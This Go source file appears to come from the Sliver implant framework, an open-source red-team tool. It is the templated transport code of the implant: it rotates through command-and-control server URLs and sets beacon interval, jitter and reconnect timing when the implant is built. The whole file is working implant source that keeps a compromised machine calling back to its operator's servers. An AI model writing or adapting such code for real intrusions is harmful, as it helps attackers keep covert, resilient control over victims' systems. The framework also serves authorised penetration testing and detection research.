package transports

/*
	Sliver Implant Framework
	Copyright (C) 2021  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"net/url"
	"strconv"
	"time"

	"github.com/bishopfox/sliver/implant/sliver/util"
)

const (
	strategyRandom       = "r"
	strategyRandomDomain = "rd"
	strategySequential   = "s"
)

// C2Generator - Creates a stream of C2 URLs based on a connection strategy
func C2Generator(abort <-chan struct{}, temporaryC2 ...string) <-chan *url.URL {
	// {{if .Config.Debug}}
	log.Printf("Starting c2 url generator ({{.Config.ConnectionStrategy}}) ...")
	// {{end}}

	c2Servers := []func() string{}
	// Any temporary C2 servers that are defined will override what is configured in the implant
	if len(temporaryC2) > 0 {
		for _, c2 := range temporaryC2 {
			c2 := c2
			c2Servers = append(c2Servers, func() string {
				return c2
			})
		}
	} else {
		// {{range $index, $value := .Config.C2}}
		c2Servers = append(c2Servers, func() string {
			return "{{$value.URL}}" // {{$index}}
		})
		// {{end}} - range
	}

	generator := make(chan *url.URL)
	go func() {
		defer close(generator)
		c2Counter := uint(0)
		for {
			var next string
			switch "{{.Config.ConnectionStrategy}}" {
			case strategyRandom: // Random
				next = c2Servers[util.Intn(len(c2Servers))]()
			case strategyRandomDomain: // Random Domain
				// Select the next sequential C2 then use it's protocol to make a random
				// selection from all C2s that share it's protocol.
				next = c2Servers[util.Intn(len(c2Servers))]()
				next = randomCCDomain(c2Servers, next)
			case strategySequential: // Sequential
				next = c2Servers[c2Counter%uint(len(c2Servers))]()
			default:
				next = c2Servers[c2Counter%uint(len(c2Servers))]()
			}
			c2Counter++
			if ^uint(0) < c2Counter {
				panic("counter overflow")
			}
			uri, err := url.Parse(next)
			if err != nil {
				// {{if .Config.Debug}}
				log.Printf("Failed to parse C2 url (%s): %s", next, err)
				// {{end}}
				continue
			}

			// {{if .Config.Debug}}
			log.Printf("Yield c2 uri = '%s'", uri)
			// {{end}}

			// Generate next C2 URL or abort
			select {
			case generator <- uri:
			case <-abort:
				return
			}
		}
	}()
	// {{if .Config.Debug}}
	log.Printf("Return generator: %#v", generator)
	// {{end}}
	return generator
}

// randomCCDomain - Random selection within a protocol
func randomCCDomain(ccServers []func() string, next string) string {
	uri, err := url.Parse(next)
	if err != nil {
		return next
	}
	pool := []func() string{}
	protocol := uri.Scheme
	for _, cc := range ccServers {
		uri, err := url.Parse(cc())
		if err != nil {
			continue
		}
		if uri.Scheme == protocol {
			pool = append(pool, cc)
		}
	}
	return pool[util.Intn(len(pool))]()
}

var (
	// reconnectInterval - DO NOT ACCESS DIRECTLY
	reconnectInterval = time.Duration(0)

	// {{if .Config.IsBeacon}}
	jitter   = time.Duration(0)
	interval = time.Duration(0)
	// {{end}}
)

// GetReconnectInterval - Parse the reconnect interval inserted at compile-time
func GetReconnectInterval() time.Duration {
	if reconnectInterval == time.Duration(0) {
		reconnect, err := strconv.ParseInt(`{{.Config.ReconnectInterval}}`, 10, 64)
		if err != nil {
			reconnectInterval = 60 * time.Second
		} else {
			reconnectInterval = time.Duration(reconnect)
		}
	}
	return reconnectInterval
}

// SetReconnectInterval - Runtime set the running reconnect interval
func SetReconnectInterval(interval int64) {
	reconnectInterval = time.Duration(interval)
}

// GetJitter - Get the beacon jitter {{if .Config.IsBeacon}}
func GetJitter() int64 {
	if jitter == time.Duration(0) {
		configJitter, err := strconv.ParseInt(`{{.Config.BeaconJitter}}`, 10, 64)
		jitter = time.Duration(configJitter)
		if err != nil {
			jitter = time.Duration(30 * time.Second)
		}
	}
	return int64(jitter)
}

// SetJitter - Set the jitter value dynamically
func SetJitter(newJitter int64) {
	jitter = time.Duration(newJitter)
}

// {{end}} - IsBeacon

// GetInterval - Get the beacon interval {{if .Config.IsBeacon}}
func GetInterval() int64 {
	if interval == time.Duration(0) {
		configInterval, err := strconv.ParseInt(`{{.Config.BeaconInterval}}`, 10, 64)
		if err != nil {
			interval = time.Duration(30 * time.Second)
		}
		interval = time.Duration(configInterval)
	}
	return int64(interval)
}

// SetInterval - Set the interval value dynamically
func SetInterval(newInterval int64) {
	interval = time.Duration(newInterval)
}

// {{end}} - IsBeacon

// GetMaxConnectionErrors - Parse the max connection errors inserted at compile-time
func GetMaxConnectionErrors() int {
	maxConnectionErrors, err := strconv.Atoi(`{{.Config.MaxConnectionErrors}}`)
	if err != nil {
		return 1000
	}
	return maxConnectionErrors
}
